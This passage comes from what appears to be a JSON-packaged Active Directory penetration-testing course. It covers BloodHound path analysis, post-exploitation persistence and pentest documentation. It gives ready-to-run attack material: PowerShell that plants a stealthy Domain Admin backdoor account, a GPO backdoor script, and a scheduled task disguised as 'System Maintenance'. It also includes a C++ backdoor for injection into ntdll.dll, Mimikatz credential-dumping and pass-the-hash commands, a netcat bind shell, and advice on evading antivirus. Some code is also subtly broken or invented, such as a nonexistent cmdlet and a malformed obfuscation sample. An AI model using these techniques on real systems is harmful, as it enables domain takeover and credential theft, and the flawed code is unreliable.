important query.  It shows you the shortest sequence of actions required to gain Domain Admin privileges.\r\n    *   **\"Find all domain admins\":** Lists all accounts with Domain Admin privileges.\r\n    *   **\"Find Principals with DCSync rights\":** Identifies accounts that can replicate the entire Active Directory database.  These accounts are effectively domain admins.\r\n    *   **\"Find all computers where user X is an admin\":**  Shows you all the computers where a specific user has local administrator privileges.\r\n    *   **\"Find all users who can reset password of user Y\":** Shows which users have the permissions to reset the password of another user, a common attack vector.\r\n\r\n*   **Identifying Shortest Paths to Domain Admin:**\r\n\r\n    1.  **Click the \"Shortest Paths to Domain Admins\" button.**\r\n    2.  **BloodHound will display a graph showing the shortest paths from your current position (or any selected node) to a Domain Admin account.**  The paths are represented as a series of nodes and edges.\r\n    3.  **Click on the edges to see the actions required to traverse that edge (e.g., \"User X is member of Group Y\", \"Computer Z is managed by GPO A\").**\r\n\r\n*   **Discovering Hidden Attack Vectors:**\r\n\r\n    BloodHound can reveal attack vectors that are not immediately obvious.  For example:\r\n\r\n    *   **Unintended Delegation:**  A user might have unintended delegation rights to a service account, allowing them to impersonate that account and gain access to sensitive resources.\r\n    *   **Circular Group Memberships:**  A user might be a member of a group that is a member of another group, which ultimately grants them elevated privileges.\r\n    *   **Misconfigured GPOs:**  A GPO might be configured to allow a specific user or group to install software or execute commands on a large number of machines.\r\n    *   **ACL Abuse:**  A user might have write access to a specific object in Active Directory, allowing them to modify its attributes and gain control over it.\r\n\r\n*   **Analyzing Group Memberships, GPOs, and ACLs:**\r\n\r\n    BloodHound allows you to drill down into the details of group memberships, GPOs, and ACLs to identify potential vulnerabilities.\r\n\r\n    *   **Group Memberships:**  You can see which users are members of which groups, and which privileges those groups have.\r\n    *   **GPOs:**  You can see which computers are managed by which GPOs, and which settings are configured in those GPOs.  Look for GPOs that allow script execution or software installation.\r\n    *   **ACLs:** You can see which users or groups have access to specific objects in Active Directory, and what permissions they have.  Look for unexpected write or modify permissions.\r\n\r\n---\r\n\r\n**Subtopic 4: Domain Admin Escalation**\r\n\r\n*   **Exploiting Identified Attack Paths to Gain Domain Administrator Privileges:**\r\n\r\n    Once you've identified an attack path in BloodHound, you need to exploit it to gain Domain Admin privileges.  This typically involves a series of actions:\r\n\r\n    1.  **Compromise an initial user account:**  This might involve password spraying, credential stuffing, or exploiting a vulnerability on a workstation.\r\n    2.  **Move laterally to other systems:**  Use Pass-the-Hash, Pass-the-Ticket, or other lateral movement techniques to gain access to more privileged accounts or systems.\r\n    3.  **Exploit misconfigured delegation settings:**  Impersonate a service account that has elevated privileges.\r\n    4.  **Abuse group memberships:**  Gain membership in a group that has Domain Admin privileges.\r\n    5.  **Modify GPOs:**  Modify a GPO to execute malicious code on a large number of machines.\r\n\r\n*   **Using BloodHound to Identify Vulnerable Accounts and Systems:**\r\n\r\n    BloodHound can help you identify vulnerable accounts and systems by highlighting:\r\n\r\n    *   **Accounts with weak or default passwords:**  These accounts are easy targets for password spraying.\r\n    *   **Systems with known vulnerabilities:**  These systems can be exploited to gain initial access or move laterally.\r\n    *   **Accounts with excessive privileges:**  These accounts are potential targets for privilege escalation attacks.\r\n    *   **Systems with misconfigured security settings:**  These systems might be vulnerable to a variety of attacks.\r\n\r\n---\r\n\r\n**Subtopic 5: Advanced BloodHound Queries**\r\n\r\n*   **Custom Queries for Specific Attack Scenarios:**\r\n\r\n    BloodHound's Cypher query language allows you to create custom queries for specific attack scenarios. Here are some examples:\r\n\r\n    *   **Find all users who can write to a specific GPO:**\r\n\r\n        ```cypher\r\n        MATCH (u:User)-[:MemberOf]->(g:Group)-[:AdminTo]->(gpo:GPO)\r\n        WHERE gpo.name = \"YourGPOName\"\r\n        RETURN u, g, gpo\r\n        ```\r\n\r\n    *   **Find all computers where a specific user is logged in and is also a local administrator:**\r\n\r\n        ```cypher\r\n        MATCH (u:User)-[:MemberOf]->(g:Group {name: \"Administrators\"})<-[:LocalAdmin]-(c:Computer)-[:HasSession]->(u)\r\n        WHERE u.name = \"YourUsername\"\r\n        RETURN u, c\r\n        ```\r\n\r\n    *   **Find all users who can reset the password of a Domain Admin:**\r\n\r\n        ```cypher\r\n        MATCH (da:User {domain: \"YOURDOMAIN\", isadmin: true})\r\n        MATCH (u:User)-[:CanChangePassword]->(da)\r\n        RETURN u, da\r\n        ```\r\n\r\n        **Note:** Replace `YOURDOMAIN` with your actual domain name.\r\n\r\n*   **Reporting and Visualization of Attack Paths:**\r\n\r\n    BloodHound allows you to generate reports and visualizations of attack paths.  You can export the graph as an image or a JSON file. You can also copy the Cypher query to share with others.\r\n\r\n---\r\n\r\n**Subtopic 6: Case Study: Analyzing Real-World BloodHound Findings and Their Impact on Security**\r\n\r\n*   **Example Scenario:**\r\n\r\n    A large organization has a complex Active Directory environment with multiple domains, forests, and trust relationships.  A penetration test reveals that a low-privileged user account can gain Domain Admin privileges through a series of misconfigured delegation settings and group memberships.\r\n\r\n    1.  **Initial Access:** The attacker compromises a low-privileged user account through password spraying.\r\n    2.  **BloodHound Analysis:** The attacker uses SharpHound to collect data from the Active Directory environment and uploads the data to BloodHound.\r\n    3.  **Attack Path Discovery:** BloodHound identifies a path from the compromised user account to a Domain Admin account.  The path involves:\r\n        *   The user being a member of a group that has write access to a specific service account.\r\n        *   The service account having unconstrained delegation enabled.\r\n        *   A Domain Controller trusting the service account for delegation.\r\n    4.  **Exploitation:** The attacker exploits the misconfigured delegation settings to impersonate the service account and gain access to the Domain Controller.  From there, they can dump the Domain Admin credentials and gain full control of the Active Directory environment.\r\n    5.  **Impact:** The attacker can access sensitive data, disrupt business operations, and compromise the entire organization.\r\n\r\n*   **Lessons Learned:**\r\n\r\n    *   Complex Active Directory environments are difficult to secure manually.\r\n    *   BloodHound is a powerful tool for identifying hidden attack paths.\r\n    *   Misconfigured delegation settings and group memberships are common vulnerabilities.\r\n    *   Proactive security measures are essential to prevent domain compromise.\r\n\r\n---\r\n\r\n**Module Project:**\r\n\r\n1.  **Install and Configure BloodHound:** Install Neo4j and the BloodHound GUI in your lab environment.\r\n2.  **Collect Data:** Use SharpHound to collect data from your Active Directory domain.  Experiment with different collectors and options.\r\n3.  **Analyze Data:** Analyze the data in BloodHound to identify the shortest path to domain admin.\r\n4.  **Exploit Attack Path:** Exploit the identified attack path to gain domain administrator privileges.  Document your steps.\r\n5.  **Automate Data Collection:** Create a PowerShell script that automates the BloodHound data collection process and highlights critical attack paths.  The script should:\r\n\r\n    *   Accept parameters for the domain, username, and password.\r\n    *   Run SharpHound with the specified parameters.\r\n    *   Parse the SharpHound output and identify the shortest path to domain admin.\r\n    *   Generate a report that summarizes the findings.\r\n\r\nHere's a starting point for your PowerShell script:\r\n\r\n```powershell\r\nparam (\r\n    [string]$Domain = $(Read-Host \"Enter Domain Name\"),\r\n    [string]$Username = $(Read-Host \"Enter Username\"),\r\n    [string]$Password = $(Read-Host \"Enter Password\")\r\n)\r\n\r\n# Define the SharpHound executable path\r\n$SharpHoundPath = \".\\SharpHound.exe\"  # Adjust if SharpHound is in a different location\r\n\r\n# Define the output directory\r\n$OutputDirectory = \".\\BloodHoundData\"\r\n\r\n# Create the output directory if it doesn't exist\r\nif (!(Test-Path -Path $OutputDirectory)) {\r\n    New-Item -ItemType Directory -Path $OutputDirectory\r\n}\r\n\r\n# Construct the SharpHound command\r\n$SharpHoundCommand = \"$SharpHoundPath -c All -d $Domain -u $Username -p $Password -o $OutputDirectory\"\r\n\r\n# Execute the SharpHound command\r\nWrite-Host \"Running SharpHound...\"\r\nInvoke-Expression $SharpHoundCommand\r\n\r\nWrite-Host \"SharpHound data collection complete.  Data saved to $OutputDirectory\"\r\n\r\n# Basic path identification (This is a placeholder and would need significant parsing and analysis of the JSON files)\r\nWrite-Host \"Analyzing data (Placeholder - Requires JSON parsing)\"\r\nWrite-Host \"This script needs to be expanded to parse the JSON output from SharpHound and identify critical attack paths.\"\r\nWrite-Host \"Consider using PowerShell's ConvertFrom-Json cmdlet to read the JSON files and then query the data.\"\r\n\r\nWrite-Host \"Script Complete.\"\r\n```\r\n\r\n**Important Considerations for the Project:**\r\n\r\n*   **Error Handling:**  Add error handling to your script to gracefully handle situations where SharpHound fails to collect data or the specified parameters are invalid.\r\n*   **JSON Parsing:**  Learn how to use PowerShell's `ConvertFrom-Json` cmdlet to parse the JSON files that SharpHound generates.  This will allow you to extract the data you need to identify attack paths.  This is the most challenging, but most rewarding part of the project. Focus on parsing the `computers.json`, `users.json`, and `groups.json` files to build a basic understanding of the relationships.\r\n*   **Attack Path Identification:**  Develop an algorithm to identify the shortest path to domain admin based on the parsed JSON data.  This might involve using PowerShell's array manipulation and filtering capabilities.  (This is an advanced task, aim for basic functionality first).\r\n*   **Reporting:**  Generate a clear and concise report that summarizes the findings, including the shortest path to domain admin and any other critical vulnerabilities.\r\n\r\nThis module is challenging but incredibly rewarding. By the end, you'll have a deep understanding of how BloodHound can be used to identify and exploit complex attack vectors in Active Directory environments.  Good luck!  And remember, ethical hacking is key.  Only use these techniques in a controlled lab environment with proper authorization."
    },
    {
      "title": "module_7",
      "description": "module_7 Overview",
      "order": 7,
      "content": "Okay, let's dive deep into Module 7: Post-Exploitation in Active Directory - Maintaining Access & Persistence. This is where we solidify our control after breaching the perimeter. We'll be covering how to establish backdoors, dump credentials, and evade detection. Remember, this is for ethical hacking purposes only!\r\n\r\n---\r\n\r\n**Module 7: Post-Exploitation in Active Directory - Maintaining Access & Persistence**\r\n\r\n**Module Objective:** Learn and apply techniques to maintain access and establish persistence within the compromised Active Directory environment.\r\n\r\n---\r\n\r\n**Subtopic 1: Understanding Post-Exploitation - Securing Your Foothold and Maintaining Control**\r\n\r\n*   **What is Post-Exploitation?**  It's the phase after successfully exploiting a vulnerability and gaining access to a system or network. The goal is now to solidify that access, gather more information, and prepare for long-term control or further exploitation.  Think of it as setting up shop *inside* the target.\r\n\r\n*   **Why is it important?**  Initial access can be fleeting.  A system reboot, a patch, or even a vigilant admin can kick you out.  Post-exploitation techniques help ensure you can regain access even after such events.  It also allows you to gather more information, escalate privileges further, and move laterally if you haven't already achieved your objectives.\r\n\r\n*   **Key Considerations:**\r\n    *   **Stealth:**  The more noise you make, the more likely you are to be detected.  Choose techniques that minimize your footprint.\r\n    *   **Persistence:**  Ensure you can regain access even after a reboot or other system changes.\r\n    *   **Privilege Escalation:**  If you haven't already achieved the necessary privileges (e.g., Domain Admin), continue working towards that goal.\r\n    *   **Data Exfiltration:**  If your objective includes stealing data, this is the time to plan and execute that phase.\r\n\r\n---\r\n\r\n**Subtopic 2: Backdoors**\r\n\r\nBackdoors provide a way to regain access to a compromised system or network.  They are essentially secret entry points that bypass normal authentication mechanisms.\r\n\r\n*   **Types of Backdoors:**\r\n\r\n    *   **Creating User Accounts with Hidden Privileges:** This is a classic and often effective technique.\r\n\r\n        *   **Method:** Create a new user account with Domain Admin privileges (or any other necessary level of access) but make it less conspicuous.\r\n        *   **Example (PowerShell):**\r\n\r\n            ```powershell\r\n            # Create a new user account\r\n            New-ADUser -Name \"SVC_Backup\" -SamAccountName \"SVC_Backup\" -AccountPassword (ConvertTo-SecureString \"P@sswOrd123!\" -AsPlainText -Force) -PasswordNeverExpires $true -Enabled $true\r\n\r\n            # Add the user to the Domain Admins group\r\n            Add-ADGroupMember -Identity \"Domain Admins\" -Members \"SVC_Backup\"\r\n            ```\r\n\r\n        *   **Stealth Considerations:**\r\n            *   Give the account a non-suspicious name (e.g., `SVC_Backup`, `HelpDesk_Admin`).\r\n            *   Set a complex password.\r\n            *   Consider hiding the account by removing it from the Global Address List (GAL) in Exchange, if applicable.\r\n\r\n    *   **Modifying GPOs to Execute Malicious Code:** Group Policy Objects (GPOs) can be a powerful way to deploy backdoors across an entire domain.\r\n\r\n        *   **Method:** Edit an existing GPO (or create a new one) to execute a script or program on target machines.\r\n        *   **Example (PowerShell - Modifying an existing GPO to run a script):**\r\n\r\n            ```powershell\r\n            #Requires -Modules ActiveDirectory\r\n\r\n            # Find a suitable GPO (e.g., a GPO that applies to all computers in the domain)\r\n            $GPO = Get-GPO -All | Where-Object {$_.DisplayName -like \"*Default Domain Policy*\"}\r\n\r\n            # Create a script to be executed (e.g., creating a backdoor user)\r\n            $ScriptContent = @\"\r\n            New-ADUser -Name \"SVC_Backup\" -SamAccountName \"SVC_Backup\" -AccountPassword (ConvertTo-SecureString \"P@sswOrd123!\" -AsPlainText -Force) -PasswordNeverExpires \\$true -Enabled \\$true\r\n            Add-ADGroupMember -Identity \"Domain Admins\" -Members \"SVC_Backup\"\r\n            \"@\r\n\r\n            # Save the script to a file share accessible by all machines\r\n            $ScriptPath = \"\\\\\\\\dc.example.com\\\\NETLOGON\\\\backdoor.ps1\"\r\n            $ScriptContent | Out-File -FilePath $ScriptPath\r\n\r\n            # Set the GPO to execute the script on startup\r\n            Set-GPPrefRegistryValue -Name $GPO.DisplayName -Context Computer -Action Create -Type String -Key \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"BackdoorScript\" -Value $ScriptPath\r\n\r\n            #Force the GPO update to take effect.\r\n            gpupdate /force\r\n            ```\r\n\r\n        *   **Stealth Considerations:**\r\n            *   Choose a GPO that already applies to a wide range of computers.\r\n            *   Hide the script in a seemingly legitimate location.\r\n            *   Use PowerShell obfuscation techniques to make the script harder to understand.\r\n            *   Set the script to run only once (e.g., using a registry key check).\r\n\r\n    *   **Installing Persistent Backdoors on Domain Controllers:** Domain Controllers (DCs) are the keys to the kingdom.  A persistent backdoor on a DC gives you ultimate control.\r\n\r\n        *   **Method:** Modify system files or services on the DC to create a hidden entry point.  A classic technique involves modifying the `lsass.exe` process to allow for credential dumping (covered later). However, for persistence, we need something more reliable. Another approach is to modify the `ntdll.dll` to allow for backdoor access.\r\n        *   **Disclaimer:**  Modifying system files on a DC is extremely risky and can cause serious stability issues.  Proceed with extreme caution and only in a lab environment!\r\n\r\n        *   **Example (Conceptual - Modifying `ntdll.dll` requires advanced assembly knowledge and is beyond the scope of a simple example, but here's the concept):**\r\n            1.  **Disassemble `ntdll.dll`:** Use a disassembler like IDA Pro or Ghidra to analyze the DLL's code.\r\n            2.  **Identify a suitable function:** Find a function that is frequently called and doesn't have critical dependencies.\r\n            3.  **Inject your code:**  Insert your backdoor code into the chosen function. This might involve creating a new thread or executing a shellcode.\r\n            4.  **Reassemble the DLL:** Reassemble the modified DLL.\r\n            5.  **Replace the original `ntdll.dll`:** Replace the original DLL with your modified version.  This requires SYSTEM privileges and might involve stopping related services.\r\n            6. **Example of a simple backdoor (very basic, replace with more sophisticated code):**\r\n            ```c++\r\n            // Injected into ntdll.dll\r\n            void MyBackdoorFunction() {\r\n                // This is a very simplistic example.\r\n                // A real backdoor would involve more complex logic,\r\n                // such as listening on a port for incoming connections\r\n                // or executing commands based on specific triggers.\r\n                system(\"net user BackdoorUser P@ssword123! /add /domain\");\r\n                system(\"net localgroup \\\"Domain Admins\\\" BackdoorUser /add /domain\");\r\n            }\r\n            ```\r\n\r\n        *   **Stealth Considerations:**\r\n            *   Choose a less critical system file.\r\n            *   Use code obfuscation techniques to hide your backdoor code.\r\n            *   Implement anti-forensic measures to remove traces of your modifications.\r\n\r\n    *   **Using Scheduled Tasks for Persistence:** Scheduled Tasks can be used to execute code at specific times or events.\r\n\r\n        *   **Method:** Create a scheduled task that runs a malicious script or program.\r\n        *   **Example (PowerShell):**\r\n\r\n            ```powershell\r\n            # Create a scheduled task to run a script every day at 3 AM\r\n            $Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\backdoor.ps1\"\r\n            $Trigger = New-ScheduledTaskTrigger -Daily -At 3am\r\n            $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::FromHours(24)) -RestartCount 3 -RestartInterval ([TimeSpan]::FromMinutes(1))\r\n            Register-ScheduledTask -TaskName \"System Maintenance\" -Action $Action -Trigger $Trigger -Settings $Settings -Description \"Performs routine system maintenance.\" -User \"NT AUTHORITY\\SYSTEM\" -RunLevel Highest\r\n            ```\r\n\r\n        *   **Stealth Considerations:**\r\n            *   Give the task a non-suspicious name (e.g., \"System Maintenance\").\r\n            *   Set the task to run at a time when the system is likely to be idle.\r\n            *   Hide the script in a seemingly legitimate location.\r\n            *   Use PowerShell obfuscation techniques to make the script harder to understand.\r\n\r\n---\r\n\r\n**Subtopic 3: Credential Dumping**\r\n\r\nCredential dumping is the process of extracting usernames and passwords (or their hashes) from a compromised system.  This information can be used for lateral movement, privilege escalation, or accessing sensitive data.\r\n\r\n*   **Mimikatz:**  The most popular and powerful tool for credential dumping.\r\n\r\n    *   **Functionality:**  Mimikatz can extract plaintext passwords, NTLM hashes, Kerberos tickets, and other sensitive information from memory.\r\n    *   **Usage (Example):**\r\n\r\n        ```\r\n        mimikatz # privilege::debug\r\n        mimikatz # sekurlsa::logonpasswords\r\n        ```\r\n\r\n    *   **`lsass.exe` Process:**  `lsass.exe` (Local Security Authority Subsystem Service) is a critical Windows process that handles user authentication.  It stores passwords and other credentials in memory.  Mimikatz targets `lsass.exe` to extract this information.\r\n\r\n*   **Protecting Credentials from Dumping:**\r\n\r\n    *   **Credential Guard:**  Uses virtualization-based security to isolate `lsass.exe` and protect it from credential theft attacks.  Requires specific hardware and software requirements.\r\n    *   **LSA Protection:**  Prevents unauthorized processes from accessing `lsass.exe`.  Can be enabled through registry settings.\r\n\r\n        *   **Enabling LSA Protection (Registry):**\r\n\r\n            ```\r\n            HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\r\n            Value Name: RunAsPPL\r\n            Value Type: REG_DWORD\r\n            Value Data: 1\r\n            ```\r\n\r\n        *   **Note:** Enabling LSA Protection can break compatibility with some applications. Test thoroughly before deploying in a production environment.\r\n\r\n    * **Other Mitigation Techniques:**\r\n        * **Disable NTLM:** NTLM is an older, less secure authentication protocol. Disabling it can reduce the attack surface.\r\n        * **Enforce strong passwords:** Use complex passwords and enforce regular password changes.\r\n        * **Implement multi-factor authentication (MFA):** MFA adds an extra layer of security to the authentication process.\r\n        * **Monitor for suspicious activity:** Use security information and event management (SIEM) systems to detect and respond to credential dumping attempts.\r\n\r\n---\r\n\r\n**Subtopic 4: Netcat - A Versatile Tool for Network Communication and Backdoor Creation**\r\n\r\nNetcat (\"nc\") is a command-line utility that can be used to read and write data across network connections.  It's often referred to as the \"Swiss Army knife\" of networking tools.\r\n\r\n*   **Functionality:**\r\n    *   Creating TCP or UDP connections.\r\n    *   Listening for incoming connections.\r\n    *   Port scanning.\r\n    *   File transfer.\r\n    *   Creating simple backdoors.\r\n\r\n*   **Creating a Simple Backdoor (Example):**\r\n\r\n    *   **Target Machine (Listening):**\r\n\r\n        ```\r\n        nc -l -p 4444 -e cmd.exe\r\n        ```\r\n\r\n        *   `-l`: Listen for incoming connections.\r\n        *   `-p 4444`: Listen on port 4444.\r\n        *   `-e cmd.exe`: Execute `cmd.exe` (the command prompt) when a connection is established.\r\n\r\n    *   **Attacker Machine (Connecting):**\r\n\r\n        ```\r\n        nc <target_ip> 4444\r\n        ```\r\n\r\n        *   `<target_ip>`: The IP address of the target machine.\r\n\r\n    *   **Explanation:**  The target machine listens on port 4444. When the attacker connects, Netcat executes `cmd.exe` and connects its input and output to the network connection.  The attacker can then execute commands on the target machine.\r\n\r\n*   **Stealth Considerations:**\r\n\r\n    *   Use a non-standard port.\r\n    *   Encrypt the traffic using tools like `stunnel`.\r\n    *   Consider using a more sophisticated backdoor that provides more control and stealth capabilities.\r\n\r\n---\r\n\r\n**Subtopic 5: PowerShell Empire (Brief Overview)**\r\n\r\nPowerShell Empire is a post-exploitation framework that provides a wide range of tools and modules for attacking Windows networks.\r\n\r\n*   **Functionality:**\r\n    *   Credential harvesting.\r\n    *   Lateral movement.\r\n    *   Privilege escalation.\r\n    *   Data exfiltration.\r\n    *   Backdoor creation.\r\n    *   Bypassing antivirus and intrusion detection systems.\r\n\r\n*   **Why it's powerful:**\r\n    *   Uses PowerShell, which is often whitelisted in Windows environments.\r\n    *   Provides a modular architecture that allows for easy customization and extension.\r\n    *   Includes built-in evasion techniques.\r\n\r\n*   **Note:**  PowerShell Empire is a complex tool that requires significant time and effort to learn.  This is just a brief overview.  Consider exploring other post-exploitation frameworks like Metasploit.  PowerShell Empire is no longer actively maintained, but it's still a valuable tool for learning post-exploitation techniques.\r\n\r\n---\r\n\r\n**Subtopic 6: Defensive Evasion**\r\n\r\nDefensive evasion is the process of avoiding detection by security tools like antivirus (AV) and intrusion detection systems (IDS).\r\n\r\n*   **Techniques:**\r\n\r\n    *   **Obfuscating Code and Payloads:**  Making your code harder to understand by using techniques like:\r\n        *   **Variable Renaming:**  Replacing meaningful variable names with random characters.\r\n        *   **String Encryption:**  Encrypting strings to hide them from static analysis.\r\n        *   **Code Insertion:**  Adding unnecessary code to make the code harder to follow.\r\n        *   **PowerShell Obfuscation (Example):**\r\n\r\n            ```powershell\r\n            # Original script\r\n            Write-Host \"Hello, world!\"\r\n\r\n            # Obfuscated script\r\n            $a = [char[]](\"H\",[char[]](\"e\",[char[]](\"l\",[char[]](\"l\",[char[]](\"o\",[char[]](\",\",[char[]](\" \",[char[]](\"w\",[char[]](\"o\",[char[]](\"r\",[char[]](\"l\",[char[]](\"d\",[char[]](\"!\")))))))))))));\r\n            $b = \"\";\r\n            foreach ($c in $a) { $b += $c }\r\n            Invoke-Expression \"Write-Host $($b)\"\r\n            ```\r\n\r\n    *   **Polymorphism:**  Changing the code of your payload each time it's executed to avoid signature-based detection.\r\n    *   **Metamorphism:**  Rewriting the code of your payload each time it's executed to avoid signature-based detection.\r\n    *   **Using Legitimate Tools:**  Leveraging built-in Windows tools (e.g., PowerShell, `certutil.exe`) to perform malicious activities.  This makes it harder to distinguish your actions from legitimate system activity.\r\n    *   **Delaying Execution:**  Waiting for a period of time before executing your payload to avoid detection by sandboxes.\r\n    *   **Process Injection:**  Injecting your payload into a legitimate process to hide its activity.\r\n\r\n---\r\n\r\n**Subtopic 7: Case Study: Analyzing Real-World Post-Exploitation Scenarios and Detection Methods**\r\n\r\n*   **Scenario:**  A compromised web server is used as a pivot point to access the internal network.  The attacker installs a backdoor on the web server and uses credential dumping to obtain user credentials.  The attacker then uses these credentials to move laterally and gain access to a Domain Controller.\r\n*   **Detection Methods:**\r\n    *   **Monitoring for suspicious network traffic:**  Look for unusual connections from the compromised web server to internal systems.\r\n    *   **Monitoring for credential dumping activity:**  Detect processes accessing `lsass.exe` or other sensitive memory locations.\r\n    *   **Monitoring for new user accounts:**  Alert on the creation of new user accounts, especially those with elevated privileges.\r\n    *   **Monitoring for scheduled task creation:**  Alert on the creation of new scheduled tasks, especially those that run suspicious scripts.\r\n    *   **Endpoint Detection and Response (EDR) solutions:**  These solutions can detect and respond to a wide range of post-exploitation activities.\r\n\r\n---\r\n\r\n**Module Project:**\r\n\r\n1.  **Implement Backdoors:** In your compromised lab environment, implement the following backdoors:\r\n    *   Create a new user account with Domain Admin privileges.\r\n    *   Modify a GPO to execute a malicious script.\r\n    *   Create a scheduled task to run a PowerShell script.\r\n2.  **Dump Credentials:** Use Mimikatz to dump credentials from memory on a compromised machine.\r\n3.  **Implement Defensive Evasion:**  Obfuscate your PowerShell scripts to avoid detection by Windows Defender.\r\n4.  **Document Your Steps:**  Document all steps taken, including code snippets, screenshots, and explanations.\r\n5.  **Create a Script:** Create a PowerShell script that automates the creation and deployment of at least *one* of the backdoors you implemented.\r\n\r\nThis module provides a solid foundation for understanding and implementing post-exploitation techniques in Active Directory environments. Remember to practice these techniques in a safe and ethical lab environment. Good luck!"
    },
    {
      "title": "module_8",
      "description": "module_8 Overview",
      "order": 8,
      "content": "Okay, buckle up! Here's the deep-dive, step-by-step material for Module 8: AD Attack Documentation & Capstone Project: Attack Tool Cloning.  This is designed to be hands-on and practical.  I'm assuming you've been diligently working through the previous modules, building your lab, and experimenting.\r\n\r\n---\r\n\r\n**Module 8: AD Attack Documentation & Capstone Project: Attack Tool Cloning**\r\n\r\n**Module Objective:** Document the entire penetration testing process, communicate findings effectively, and consolidate learned skills by creating a functional clone of a key AD attack tool.\r\n\r\n**Subtopics:**\r\n\r\n*   The Importance of Documentation: Communicating findings and providing actionable recommendations.\r\n*   Documenting the AD Penetration Testing Process.\r\n*   Report Writing.\r\n*   Remediation Strategies.\r\n*   Capstone Project: Attack Tool Cloning.\r\n\r\n---\r\n\r\n**Subtopic 1: The Importance of Documentation**\r\n\r\n*   **Why Document?**\r\n\r\n    *   **Communication:**  Your technical expertise is valuable, but useless if you can't clearly communicate your findings to stakeholders (management, IT staff, etc.). Documentation bridges that gap.\r\n    *   **Reproducibility:**  Clear documentation allows others (or yourself in the future) to reproduce your steps, verify your findings, and understand the attack chain.\r\n    *   **Actionable Insights:** A good report doesn't just point out problems; it offers concrete steps for fixing them.\r\n    *   **Legal/Compliance:** In real-world engagements, documentation is crucial for legal compliance, insurance, and demonstrating due diligence.\r\n    *   **Learning:** The act of documenting forces you to think critically about *why* things worked the way they did.\r\n\r\n*   **Key Elements of Good Documentation:**\r\n\r\n    *   **Clarity:** Use clear, concise language. Avoid jargon unless absolutely necessary and always define it.\r\n    *   **Accuracy:** Double-check your facts and figures.  Inaccurate information undermines your credibility.\r\n    *   **Completeness:**  Include all relevant information, even if it seems obvious to you.\r\n    *   **Organization:**  Structure your documentation logically.  Use headings, subheadings, and bullet points to make it easy to read.\r\n    *   **Visuals:**  Screenshots, diagrams, and code snippets can greatly enhance understanding.\r\n    *   **Context:** Explain the *why* behind the *what*.  Why is this vulnerability important?  What are the potential consequences?\r\n    *   **Actionable Recommendations:**  Provide specific, practical steps for remediation.\r\n\r\n---\r\n\r\n**Subtopic 2: Documenting the AD Penetration Testing Process**\r\n\r\nThis is where you compile everything you've done in the previous modules into a cohesive narrative.\r\n\r\n*   **Phase 1: Planning and Scope**\r\n\r\n    *   **Objective:**  Define the goals of the penetration test.  What are you trying to achieve?  What are the limitations?\r\n    *   **Scope:**  Clearly define the systems and networks that are in scope.  What is explicitly *excluded* from the test?\r\n    *   **Rules of Engagement:**  Document any specific rules or constraints.  Are there certain times when testing is prohibited?  Are there specific types of attacks that are off-limits?\r\n    *   **Example:**\r\n\r\n        ```\r\n        **Objective:**  Identify vulnerabilities in the Active Directory environment that could lead to domain compromise.\r\n\r\n        **Scope:**  The entire `contoso.local` Active Directory domain, including all domain controllers, member servers, and workstations.\r\n\r\n        **Out of Scope:**  External web applications, cloud infrastructure, and physical security.\r\n\r\n        **Rules of Engagement:**  No denial-of-service attacks are permitted.  Testing must be conducted during off-peak hours (7:00 PM - 7:00 AM local time). Account lockout thresholds must be respected.\r\n        ```\r\n\r\n*   **Phase 2: Information Gathering (Enumeration)**\r\n\r\n    *   **Objective:**  Gather as much information as possible about the target environment.  This is where you use the techniques from Module 2.\r\n    *   **Tools Used:**  List the tools you used (e.g., `nslookup`, `ldapsearch`, `Nmap`, `Enum4Linux`, PowerShell cmdlets).\r\n    *   **Commands Executed:**  Document the specific commands you ran, along with their output.\r\n    *   **Findings:**  Summarize your key findings.  What user accounts did you discover?  What groups are they members of?  What computers are in the domain?  What GPOs are in place?\r\n    *   **Example:**\r\n\r\n        ```\r\n        **Tool:** ldapsearch\r\n\r\n        **Command:** ldapsearch -x -h dc01.contoso.local -b \"DC=contoso,DC=local\" \"(objectClass=user)\" sAMAccountName displayName memberOf\r\n\r\n        **Output:** (Example)\r\n        ```\r\n        ```\r\n        dn: CN=John Doe,CN=Users,DC=contoso,DC=local\r\n        objectClass: top\r\n        objectClass: person\r\n        objectClass: organizationalPerson\r\n        objectClass: user\r\n        sAMAccountName: jdoe\r\n        displayName: John Doe\r\n        memberOf: CN=Domain Users,CN=Users,DC=contoso,DC=local\r\n        memberOf: CN=HelpDesk,OU=Groups,DC=contoso,DC=local\r\n        ```\r\n\r\n        ```\r\n        **Findings:**\r\n        *   Discovered 250 user accounts in the `contoso.local` domain.\r\n        *   Identified a \"HelpDesk\" group that appears to have elevated privileges.\r\n        *   Discovered several computers running outdated operating systems (Windows 7).\r\n        ```\r\n\r\n*   **Phase 3: Initial Access**\r\n\r\n    *   **Objective:**  Gain initial access to the network. This is where you use the techniques from Module 3.\r\n    *   **Techniques Used:**  Describe the techniques you used to gain initial access (e.g., password spraying, exploiting vulnerable services).\r\n    *   **Credentials Obtained:**  Document any credentials you obtained.\r\n    *   **Example:**\r\n\r\n        ```\r\n        **Technique:** Password spraying\r\n\r\n        **Tool:** CrackMapExec\r\n\r\n        **Command:** cme smb 10.10.10.0/24 -u users.txt -p Password123 --continue-on-success\r\n\r\n        **Findings:**  Successfully compromised the account `svc_backup` with the password \"Password123\".\r\n        ```\r\n\r\n*   **Phase 4: Lateral Movement**\r\n\r\n    *   **Objective:**  Move laterally within the network to gain access to more privileged accounts and systems. This is where you use the techniques from Module 4.\r\n    *   **Techniques Used:**  Describe the techniques you used to move laterally (e.g., Pass-the-Hash, Pass-the-Ticket, `psexec.py`).\r\n    *   **Systems Accessed:**  Document the systems you were able to access.\r\n    *   **Example:**\r\n\r\n        ```\r\n        **Technique:** Pass-the-Hash\r\n\r\n        **Tool:** Mimikatz\r\n\r\n        **Command (on compromised workstation):**\r\n        ```\r\n        ```powershell\r\n        mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:contoso.local /ntlm:$(Get-NTLMSignature -username svc_backup -password Password123) /run:powershell.exe\"\r\n        ```\r\n        ```\r\n\r\n        **Findings:**  Successfully used the `svc_backup` account's NTLM hash to authenticate to the `DC01.contoso.local` domain controller as the `administrator` user.\r\n\r\n        **Tool:** psexec.py (Impacket)\r\n\r\n        